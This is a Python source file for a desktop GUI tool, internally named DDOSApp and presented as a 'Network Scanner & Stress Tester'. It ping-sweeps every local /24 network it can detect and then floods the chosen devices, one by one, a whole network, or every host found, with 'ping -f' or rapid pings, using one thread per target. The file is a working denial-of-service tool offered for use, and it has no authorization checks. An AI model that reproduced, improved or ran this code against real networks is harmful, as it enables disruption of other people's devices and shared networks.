import os
import sys
import subprocess
import threading
import time
import socket
import re
import tkinter as tk
from tkinter import scrolledtext, messagebox, ttk
from concurrent.futures import ThreadPoolExecutor

# --- GUI CLASS ---
class DDOSApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Network Scanner & Stress Tester")
        self.root.geometry("800x600")
        self.root.configure(bg='#2b2b2b')
        
        # Configuration
        self.CHECKS_PER_DEVICE = 3
        self.MAX_THREADS = 50
        
        # Store attack processes and threads
        self.attack_processes = []
        self.attack_threads = []
        self.stop_flag = False
        self.scanning = False
        self.attacking = False
        
        # Store discovered networks and devices
        self.discovered_networks = {}  # {network: [devices]}
        self.all_devices = []  # All devices found
        
        # Style configuration
        style = ttk.Style()
        style.theme_use('clam')
        
        style.configure('Scan.TButton', 
                       background='#4CAF50', 
                       foreground='white', 
                       font=('Arial', 11, 'bold'),
                       padding=10)
        style.map('Scan.TButton',
                 background=[('active', '#45a049'), ('disabled', '#666666')],
                 foreground=[('disabled', '#999999')])
        
        style.configure('Attack.TButton', 
                       background='#ff6600', 
                       foreground='white', 
                       font=('Arial', 11, 'bold'),
                       padding=10)
        style.map('Attack.TButton',
                 background=[('active', '#cc5500'), ('disabled', '#666666')],
                 foreground=[('disabled', '#999999')])
        
        style.configure('Stop.TButton', 
                       background='#f44336', 
                       foreground='white', 
                       font=('Arial', 11, 'bold'),
                       padding=10)
        style.map('Stop.TButton',
                 background=[('active', '#da190b'), ('disabled', '#666666')],
                 foreground=[('disabled', '#999999')])
        
        # Main container
        main_container = tk.Frame(root, bg='#2b2b2b')
        main_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Title
        title_label = tk.Label(main_container, 
                              text="Network Scanner & Stress Tester", 
                              font=("Arial", 16, "bold"),
                              fg='white', 
                              bg='#2b2b2b')
        title_label.pack(pady=10)
        
        # Create PanedWindow for split view
        paned = tk.PanedWindow(main_container, orient=tk.HORIZONTAL, bg='#2b2b2b', sashwidth=5)
        paned.pack(fill=tk.BOTH, expand=True)
        
        # Left panel - Network Tree
        left_frame = tk.Frame(paned, bg='#2b2b2b')
        paned.add(left_frame, width=250)
        
        tk.Label(left_frame, 
                text="Discovered Networks", 
                font=("Arial", 11, "bold"),
                fg='white', 
                bg='#2b2b2b').pack(pady=5)
        
        # Treeview for networks and devices
        self.tree = ttk.Treeview(left_frame, height=20)
        self.tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Scrollbar for tree
        tree_scroll = ttk.Scrollbar(left_frame, orient=tk.VERTICAL, command=self.tree.yview)
        tree_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.tree.configure(yscrollcommand=tree_scroll.set)
        
        # Right panel - Log
        right_frame = tk.Frame(paned, bg='#2b2b2b')
        paned.add(right_frame, width=550)
        
        tk.Label(right_frame, 
                text="Log", 
                font=("Arial", 11, "bold"),
                fg='white', 
                bg='#2b2b2b').pack(pady=5)
        
        self.log_box = scrolledtext.ScrolledText(
            right_frame, 
            width=60, 
            height=20, 
            bg='#1e1e1e', 
            fg='#00ff00',
            insertbackground='white',
            font=('Courier', 10),
            state='disabled'
        )
        self.log_box.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Configure tags for colored text
        self.log_box.tag_config('info', foreground='#00ff00')
        self.log_box.tag_config('warning', foreground='#ffaa00')
        self.log_box.tag_config('error', foreground='#ff4444')
        self.log_box.tag_config('success', foreground='#44ff44')
        self.log_box.tag_config('attack', foreground='#ff4444')
        self.log_box.tag_config('scanning', foreground='#888888')
        self.log_box.tag_config('discovery', foreground='#00ccff')
        
        # Button Frame
        btn_frame = tk.Frame(main_container, bg='#2b2b2b')
        btn_frame.pack(pady=10, fill=tk.X)
        
        # Left buttons
        left_buttons = tk.Frame(btn_frame, bg='#2b2b2b')
        left_buttons.pack(side=tk.LEFT, padx=5)
        
        self.scan_btn = ttk.Button(
            left_buttons, 
            text="🔍 Discover Networks", 
            style='Scan.TButton',
            command=self.discover_networks
        )
        self.scan_btn.pack(side=tk.LEFT, padx=5)
        
        # Attack options frame
        attack_frame = tk.Frame(btn_frame, bg='#2b2b2b')
        attack_frame.pack(side=tk.LEFT, padx=20)
        
        self.attack_all_btn = ttk.Button(
            attack_frame, 
            text="⚡ Attack ALL", 
            style='Attack.TButton',
            command=lambda: self.start_attack("all"),
            state='disabled'
        )
        self.attack_all_btn.pack(side=tk.LEFT, padx=5)
        
        self.attack_selected_btn = ttk.Button(
            attack_frame, 
            text="🎯 Attack Selected", 
            style='Attack.TButton',
            command=lambda: self.start_attack("selected"),
            state='disabled'
        )
        self.attack_selected_btn.pack(side=tk.LEFT, padx=5)
        
        self.attack_network_btn = ttk.Button(
            attack_frame, 
            text="🌐 Attack Network", 
            style='Attack.TButton',
            command=lambda: self.start_attack("network"),
            state='disabled'
        )
        self.attack_network_btn.pack(side=tk.LEFT, padx=5)
        
        # Right buttons
        right_buttons = tk.Frame(btn_frame, bg='#2b2b2b')
        right_buttons.pack(side=tk.RIGHT, padx=5)
        
        self.stop_btn = ttk.Button(
            right_buttons, 
            text="⏹ Stop All Attacks", 
            style='Stop.TButton',
            command=self.stop_all
        )
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        # Progress bar
        self.progress_var = tk.DoubleVar()
        self.progress_bar = ttk.Progressbar(
            main_container, 
            variable=self.progress_var, 
            length=600
        )
        self.progress_bar.pack(pady=5)
        
        # Status bar
        self.status_label = tk.Label(
            main_container, 
            text="Ready - Click 'Discover Networks' to start", 
            font=("Arial", 9),
            fg='#aaaaaa', 
            bg='#2b2b2b',
            anchor=tk.W
        )
        self.status_label.pack(fill=tk.X, pady=5)
        
        # Handle window close event
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        
        # Log startup
        self.log("=" * 60, 'info')
        self.log("Network Scanner & Stress Tester Started", 'info')
        self.log("=" * 60, 'info')
        self.log(f"UID: {os.getuid()} {'(Root)' if os.getuid() == 0 else '(User)'}", 'info')
        if os.getuid() != 0:
            self.log("⚠ Run with sudo for full functionality", 'warning')
        self.log("Ready to discover networks\n", 'info')

    def log(self, message, tag='info'):
        """Thread-safe logging to the UI with color tags"""
        self.root.after(0, self._update_log, message, tag)

    def _update_log(self, message, tag):
        self.log_box.config(state='normal')
        self.log_box.insert(tk.END, message + "\n", tag)
        self.log_box.see(tk.END)
        self.log_box.config(state='disabled')
        
    def update_status(self, message):
        """Update status bar"""
        self.root.after(0, self._update_status, message)
        
    def _update_status(self, message):
        self.status_label.config(text=message)
        
    def update_progress(self, value, maximum=100):
        """Update progress bar"""
        self.root.after(0, self._update_progress, value, maximum)
        
    def _update_progress(self, value, maximum):
        self.progress_var.set(value)
        self.progress_bar.config(maximum=maximum)

    def get_local_networks(self):
        """Discover all local network interfaces using system commands (no dependencies)"""
        networks = []
        
        try:
            # Use ifconfig to get network interfaces
            result = subprocess.run(['ifconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            if result.returncode != 0:
                self.log("⚠ Could not run ifconfig", 'warning')
                return networks
            
            # Parse ifconfig output
            current_interface = None
            for line in result.stdout.split('\n'):
                # Check for interface name
                if line and not line.startswith('\t') and not line.startswith(' '):
                    # Extract interface name (before the colon)
                    if ':' in line:
                        current_interface = line.split(':')[0].strip()
                
                # Look for inet (IPv4) addresses
                if current_interface and 'inet ' in line and '127.0.0.1' not in line:
                    # Parse the IP and netmask
                    parts = line.strip().split()
                    ip = None
                    netmask = None
                    
                    for i, part in enumerate(parts):
                        if part == 'inet' and i + 1 < len(parts):
                            ip = parts[i + 1]
                        elif part == 'netmask' and i + 1 < len(parts):
                            netmask = parts[i + 1]
                    
                    if ip and netmask and ip != '127.0.0.1':
                        # Skip loopback
                        if current_interface.startswith('lo'):
                            continue
                            
                        # Calculate network from IP and netmask
                        ip_parts = [int(x) for x in ip.split('.')]
                        mask_parts = [int(x, 16) for x in netmask.replace('0x', '').replace('0X', '')]
                        
                        if len(mask_parts) == 2:
                            # Convert short hex netmask to full format
                            mask_parts = [
                                (mask_parts[0] >> 8) & 0xFF,
                                mask_parts[0] & 0xFF,
                                (mask_parts[1] >> 8) & 0xFF,
                                mask_parts[1] & 0xFF
                            ]
                        
                        if len(ip_parts) == 4 and len(mask_parts) == 4:
                            network_parts = [str(ip_parts[i] & mask_parts[i]) for i in range(4)]
                            network = '.'.join(network_parts[:3])  # Get /24 network
                            
                            # Check if we already have this network
                            if not any(n['network'] == network for n in networks):
                                networks.append({
                                    'network': network,
                                    'interface': current_interface,
                                    'ip': ip,
                                    'netmask': '.'.join([str(x) for x in mask_parts])
                                })
                                self.log(f"  Found network: {network}.0/24 on {current_interface} ({ip})", 'discovery')
        
        except Exception as e:
            self.log(f"Error getting networks: {e}", 'error')
        
        # If ifconfig didn't work, try a default scan
        if not networks:
            self.log("⚠ Could not detect networks automatically", 'warning')
            self.log("  Trying common networks...", 'warning')
            
            # Try common private network ranges
            common_networks = ['192.168.0', '192.168.1', '192.168.10', '10.0.0', '172.16.0']
            
            for network in common_networks:
                # Quick check if gateway exists
                gateway = f"{network}.1"
                try:
                    result = subprocess.run(['ping', '-c', '1', '-W', '1', gateway], 
                                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
                    if result.returncode == 0:
                        networks.append({
                            'network': network,
                            'interface': 'unknown',
                            'ip': 'unknown',
                            'netmask': '255.255.255.0'
                        })
                        self.log(f"  Found active network: {network}.0/24", 'discovery')
                except:
                    pass
        
        return networks

    def is_device_alive(self, ip):
        """Pings the device to check if it's alive"""
        if self.stop_flag:
            return False
            
        for attempt in range(self.CHECKS_PER_DEVICE):
            if self.stop_flag:
                return False
                
            cmd = ['ping', '-c', '1', '-W', '1', ip]
            
            try:
                result = subprocess.run(
                    cmd, 
                    stdout=subprocess.DEVNULL, 
                    stderr=subprocess.DEVNULL,
                    timeout=2
                )
                
                if result.returncode == 0:
                    return True
                    
            except Exception:
                pass
                
        return False

    def discover_networks(self):
        """First phase: Discover all networks and devices"""
        if self.scanning:
            self.log("⚠ Discovery already in progress", 'warning')
            return
            
        self.scanning = True
        self.stop_flag = False
        self.scan_btn.config(state='disabled')
        self.attack_all_btn.config(state='disabled')
        self.attack_selected_btn.config(state='disabled')
        self.attack_network_btn.config(state='disabled')
        
        # Clear previous data
        self.discovered_networks = {}
        self.all_devices = []
        self.tree.delete(*self.tree.get_children())
        
        self.log("\n" + "=" * 60, 'discovery')
        self.log("🔍 PHASE 1: Network Discovery", 'discovery')
        self.log("=" * 60, 'discovery')
        
        # Step 1: Find local networks
        self.log("\n📡 Finding local networks...", 'discovery')
        networks = self.get_local_networks()
        
        if not networks:
            self.log("⚠ No networks found! Please check your connection.", 'warning')
            self.scanning = False
            self.scan_btn.config(state='normal')
            return
            
        self.log(f"\n✓ Found {len(networks)} network(s):", 'success')
        for net in networks:
            # Add network to tree
            network_id = self.tree.insert('', 'end', 
                                         text=f"📶 {net['network']}.0/24 ({net['interface']})", 
                                         values=('network', net['network']))
            self.discovered_networks[net['network']] = {
                'tree_id': network_id,
                'devices': []
            }
        
        # Step 2: Scan all networks for devices
        all_ips = []
        for net in networks:
            network = net['network']
            for i in range(1, 255):
                all_ips.append(f"{network}.{i}")
        
        total_ips = len(all_ips)
        self.log(f"\n🔍 Scanning {total_ips} IPs across {len(networks)} network(s)...", 'discovery')
        self.update_progress(0, total_ips)
        
        def scan_worker():
            scanned = 0
            devices_found = 0
            
            with ThreadPoolExecutor(max_workers=self.MAX_THREADS) as executor:
                futures = {executor.submit(self.is_device_alive, ip): ip for ip in all_ips}
                
                for future in futures:
                    if self.stop_flag:
                        break
                        
                    ip = futures[future]
                    scanned += 1
                    self.update_progress(scanned, total_ips)
                    self.update_status(f"Scanning... {scanned}/{total_ips}")
                    
                    try:
                        if future.result():
                            # Determine which network this IP belongs to
                            network = '.'.join(ip.split('.')[:3])
                            
                            if network in self.discovered_networks:
                                devices_found += 1
                                self.all_devices.append(ip)
                                self.discovered_networks[network]['devices'].append(ip)
                                
                                # Add device to tree
                                self.tree.insert(
                                    self.discovered_networks[network]['tree_id'],
                                    'end',
                                    text=f"💻 {ip}",
                                    values=('device', ip)
                                )
                                
                                self.log(f"[+] Found: {ip}", 'success')
                    except:
                        pass
            
            # Update UI
            if not self.stop_flag:
                self.log(f"\n✓ Discovery complete! Found {devices_found} devices.", 'success')
                
                # Enable attack buttons
                if devices_found > 0:
                    self.root.after(0, lambda: self.attack_all_btn.config(state='normal'))
                    self.root.after(0, lambda: self.attack_selected_btn.config(state='normal'))
                    self.root.after(0, lambda: self.attack_network_btn.config(state='normal'))
                    self.update_status(f"Found {devices_found} devices across {len(networks)} networks. Select targets and attack.")
                else:
                    self.update_status("No devices found. Try running with sudo.")
            else:
                self.log("\n⚠ Discovery interrupted", 'warning')
            
            self.scanning = False
            self.root.after(0, lambda: self.scan_btn.config(state='normal'))
            self.update_progress(0, 100)
            
        threading.Thread(target=scan_worker, daemon=True).start()

    def start_attack(self, mode):
        """Start attacks based on selected mode"""
        if self.attacking:
            self.log("⚠ Attacks already in progress", 'warning')
            return
            
        targets = []
        
        if mode == "all":
            # Attack all discovered devices
            targets = self.all_devices
            if not targets:
                self.log("⚠ No devices to attack!", 'warning')
                return
            self.log(f"\n⚡ Attacking ALL {len(targets)} devices...", 'attack')
            
        elif mode == "selected":
            # Attack selected devices in tree
            selected_items = self.tree.selection()
            for item in selected_items:
                values = self.tree.item(item)['values']
                if values and values[0] == 'device':
                    targets.append(values[1])
                    
            if not targets:
                self.log("⚠ No devices selected! Select devices in the tree first.", 'warning')
                self.log("  Tip: Hold Ctrl/Cmd to select multiple devices", 'info')
                return
            self.log(f"\n🎯 Attacking {len(targets)} selected devices...", 'attack')
            
        elif mode == "network":
            # Attack entire selected network
            selected_items = self.tree.selection()
            if not selected_items:
                self.log("⚠ No network selected! Select a network in the tree first.", 'warning')
                return
                
            for item in selected_items:
                values = self.tree.item(item)['values']
                if values and values[0] == 'network':
                    network = values[1]
                    if network in self.discovered_networks:
                        targets.extend(self.discovered_networks[network]['devices'])
            
            if not targets:
                self.log("⚠ No network selected! Select a network (not a device) in the tree.", 'warning')
                return
            self.log(f"\n🌐 Attacking network with {len(targets)} devices...", 'attack')
        
        if not targets:
            self.log("⚠ No targets to attack!", 'warning')
            return
            
        # Remove duplicates
        targets = list(set(targets))
        
        # Start attacks
        self.attacking = True
        self.stop_flag = False
        
        self.log("=" * 40, 'attack')
        
        for ip in targets:
            t = threading.Thread(target=self.start_flood, args=(ip,), daemon=True)
            t.start()
            time.sleep(0.1)  # Small delay between starting attacks
            
        self.log(f"⚡ All attacks launched on {len(targets)} targets", 'attack')
        self.log("=" * 40 + "\n", 'attack')
        self.update_status(f"Attacking {len(targets)} devices - Click Stop to end")
        
        # Disable attack buttons during attack
        self.attack_all_btn.config(state='disabled')
        self.attack_selected_btn.config(state='disabled')
        self.attack_network_btn.config(state='disabled')

    def start_flood(self, ip):
        """Starts the ping flood on a specific IP"""
        if self.stop_flag:
            return
            
        self.log(f"🚀 Starting attack on {ip}...", 'attack')
        
        # For non-root users, use rapid continuous ping
        if os.getuid() != 0:
            cmd = ['ping', '-i', '0.1', ip]
        else:
            cmd = ['ping', '-f', ip]
        
        try:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            self.attack_processes.append(process)
            
            current_thread = threading.current_thread()
            self.attack_threads.append(current_thread)
            
            # Keep running until stop_flag is set
            while not self.stop_flag:
                if process.poll() is not None:
                    self.log(f"⚠ Attack on {ip} ended", 'warning')
                    break
                time.sleep(0.5)
                
            # Cleanup
            if process.poll() is None:
                process.terminate()
                try:
                    process.wait(timeout=3)
                except:
                    process.kill()
                    
            if process in self.attack_processes:
                self.attack_processes.remove(process)
                
        except Exception as e:
            self.log(f"✗ Error attacking {ip}: {e}", 'error')
        finally:
            if process in self.attack_processes:
                self.attack_processes.remove(process)
            if current_thread in self.attack_threads:
                self.attack_threads.remove(current_thread)

    def stop_all(self):
        """Stop all attacks"""
        if not self.attack_processes and not self.scanning:
            self.log("ℹ No active attacks to stop", 'info')
            return
            
        self.log("\n" + "=" * 40, 'error')
        self.log("🛑 Stopping floods...", 'error')
        self.stop_flag = True
        self.scanning = False
        self.attacking = False
        self.update_status("Stopping attacks...")
        
        # Wait for attack threads
        for thread in self.attack_threads[:]:
            thread.join(timeout=2)
        
        # Kill processes
        for process in self.attack_processes[:]:
            try:
                process.terminate()
                process.wait(timeout=2)
            except:
                try:
                    process.kill()
                except:
                    pass
        
        self.attack_processes.clear()
        self.attack_threads.clear()
        self.log("✓ All attacks stopped", 'success')
        self.log("=" * 40 + "\n", 'info')
        self.update_status("Ready")
        
        # Re-enable attack buttons
        if self.all_devices:
            self.attack_all_btn.config(state='normal')
            self.attack_selected_btn.config(state='normal')
            self.attack_network_btn.config(state='normal')

    def on_closing(self):
        """Handle window close"""
        if self.attack_processes:
            if messagebox.askokcancel("Quit", "Attacks are still running. Stop them and quit?"):
                self.stop_all()
                self.root.destroy()
        else:
            self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = DDOSApp(root)
    root.mainloop()